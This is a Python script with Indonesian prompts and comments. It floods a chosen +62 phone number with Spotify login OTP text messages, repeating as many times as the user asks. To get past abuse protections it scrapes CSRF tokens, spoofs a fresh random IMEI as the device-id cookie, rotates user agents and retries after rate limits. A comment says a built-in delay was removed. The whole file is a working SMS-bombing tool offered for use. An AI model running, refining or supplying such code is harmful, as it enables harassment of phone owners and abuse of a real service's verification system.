import requests
import random
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup  # pip install beautifulsoup4

BASE_URL   = "https://accounts.spotify.com"
LOGIN_PATH = "/id/login/phone?intent=signup"
OTP_PATH   = "/login/phone/code/request"

USER_AGENTS = [
    # Android
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36",
    # iOS
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A5341f Safari/604.1",
    # Desktop
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
]

def generate_imei() -> str:
    """Buat IMEI 15-digit valid dengan Luhn."""
    def luhn_checksum(digits):
        s = 0
        for i, d in enumerate(reversed(digits)):
            n = int(d)
            if i % 2 == 0:
                n *= 2
                if n > 9: n -= 9
            s += n
        return (10 - s % 10) % 10

    base = "".join(str(random.randint(0,9)) for _ in range(14))
    return base + str(luhn_checksum(base))

def get_random_user_agent() -> str:
    return random.choice(USER_AGENTS)

def fetch_login_form(session: requests.Session):
    """
    GET halaman login, parse semua hidden inputs untuk form.
    """
    resp = session.get(
        urljoin(BASE_URL, LOGIN_PATH),
        headers={
            "User-Agent": get_random_user_agent(),
            "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
        }
    )
    resp.raise_for_status()
    soup = BeautifulSoup(resp.text, "html.parser")
    form = {}
    for inp in soup.find_all("input", {"type":"hidden"}):
        if name := inp.get("name"):
            form[name] = inp.get("value", "")
    return form, resp.url

def send_otp(session: requests.Session, phone: str):
    """
    Kirim satu request OTP:
    - ambil form & URL via fetch_login_form()
    - set IMEI acak
    - kirim POST dengan form lengkap + phonenumber
    """
    form_data, referer = fetch_login_form(session)
    csrf = session.cookies.get("sp_sso_csrf_token")
    if not csrf:
        raise RuntimeError("Gagal ambil CSRF token")

    # Acak IMEI
    imei = generate_imei()
    session.cookies.set("__Host-device_id", imei, domain="accounts.spotify.com")

    form_data["phonenumber"] = phone

    headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": BASE_URL,
        "Referer": referer,
        "User-Agent": get_random_user_agent(),
        "X-CSRF-Token": csrf,
    }

    return session.post(
        urljoin(BASE_URL, OTP_PATH),
        headers=headers,
        data=form_data
    )

def main():
    phone = input("Masukan nomornya dengan awalan +62: ").strip()
    if not phone.startswith("+62"):
        print("⚠️ Nomor harus diawali +62")
        return

    try:
        count = int(input("Berapa banyak OTP yang ingin dikirimkan? ").strip())
    except ValueError:
        print("⚠️ Masukkan angka yang valid.")
        return
    if count <= 0:
        print("⚠️ Jumlah OTP harus > 0.")
        return

    session = requests.Session()
    print(f"\nMulai kirim {count} OTP ke {phone}…\n")

    for i in range(1, count + 1):
        while True:
            resp = send_otp(session, phone)
            retry_after = resp.headers.get("Retry-After")
            try:
                body = resp.json()
            except ValueError:
                body = resp.text

            if resp.status_code == 200:
                print(f"[{i}/{count}] HTTP 200 → {body}")
                break  # sukses, lanjut ke OTP berikutnya

            # rate-limited atau error nomor
            wait = int(retry_after) if retry_after and retry_after.isdigit() else 300
            print(f"[{i}/{count}] HTTP {resp.status_code} → {body}")
            print(f"  Menunggu {wait}s sebelum retry…")
            time.sleep(wait)

        # **Jeda 15 detik dihapus**: langsung lanjut ke request berikutnya

    print("\n✅ Semua OTP telah terkirim.")

if __name__ == "__main__":
    main()
